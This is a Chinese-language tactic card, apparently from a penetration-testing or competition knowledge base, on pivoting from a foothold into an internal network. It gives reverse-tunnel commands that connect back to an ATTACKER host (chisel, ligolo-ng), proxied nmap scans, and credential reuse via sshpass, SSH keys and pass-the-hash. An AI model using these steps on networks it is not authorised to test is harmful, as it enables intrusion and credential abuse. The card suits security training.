---
id: tactics/lateral-pivot
type: tactic
tags: [lateral, pivot, 横移, 跳板, 代理, 凭据复用, 内网]
source: self
license: MIT
version: 1
updated: 2026-10-22
---

# 横移与跳板：从一台机器到一片内网

**一句话结论**：横移不是"再打一个 web"，是**用已有立足点当路由器**，把不可达变成可达；先建通道，再扫，再复用凭据。

## 前置条件（不满足就别开始）

1. 有一个**稳定立足点**（能执行命令）
2. 知道它**处在哪个网段**（`ip a` / `ip route` / `arp -a`）
3. 有一个能起**代理**的方法（chisel / ligolo-ng / ssh -D / 已有 socks5）

## 标准链路

```
① 立足点建代理  →  ② 本机走代理扫内网  →  ③ 用已有凭据打新主机  →  ④ 新立足点再建代理（递归）
```

### ① 建代理（三选一）

```bash
# chisel（最省事，单文件）
# 攻击机： ./chisel server -p 8080 --reverse
# 立足点： ./chisel client ATTACKER:8080 R:socks   → 本地 1080 socks5

# ligolo-ng（最稳，支持多层）
# 攻击机： ./proxy -selfcert -laddr 0.0.0.0:11601
# 立足点： ./agent -connect ATTACKER:11601 -ignore-cert
# 然后 proxy 里：session → iface → tunnel_start → ip route add 10.10.20.0/24 dev ligolo

# ssh -D（目标有 ssh 且你知道密码）
ssh -D 1080 user@FOOTHOLD
```

### ② 扫内网（必须走代理）

```bash
proxychains4 -q nmap -sT -Pn -p 22,80,443,445,1433,3306,3389,5432,6379,8080,9200 10.10.20.0/24
# 注意：nmap 的 -sS 走不了 socks，必须 -sT；ICMP 不通是正常的
```

### ③ 凭据复用（横移真正的加速器）

| 已有凭据 | 立刻试 |
|---|---|
| Linux 密码 | 同网段 22（`sshpass -p PW ssh user@IP`）、数据库 3306/5432、web 后台 |
| 密码哈希 | pass-the-hash（impacket / netexec） |
| SSH 私钥 | `ssh -i key user@IP`，也试其它用户名（root/admin/ubuntu） |
| 数据库口令 | 同实例跨库、其它主机的同版本 DB |
| Cookie/Token | 同域其它子站（共享会话最常见的地方） |

**规则**：一条凭据最多试 **3 个目标**，之后不管用不用都记进凭据池，交给下一轮。

### ④ 递归

每拿下一个新主机，重复 ①→③。**每次只加一跳**，不要一次铺开全网（会失控）。

## 判定标准

**算成功横移**：从新主机上执行命令并拿到输出，且该主机**原本从攻击机不可达**。
**不算**：只是扫到端口；只是从立足点 curl 通了一个页面（那只是 SSRF，不是立足点）。

## 失败即停

- 代理建不起来（端口被封/无出网）→ 换协议（DNS/ICMP 隧道），或改走"用立足点直接执行命令"而不是代理
- 内网扫完没有任何可达服务 → 记 fact，这台机器没有横移价值，回主线
- 同一凭据 3 个目标都不通 → 停，别喷第 4 个（会触发锁定，竞赛里直接判失败）

## 产出

`pivot` 卡：`from_host → proxy_endpoint → reachable_cidr → 已发现主机 → 已用凭据 → 状态`
这张卡决定后续所有命令走哪条路由。

## 关联

- 立足点清单：`tactics/post-exploit-foothold.md`
- 接口形状：`surfaces/api-shape-checklist.md`
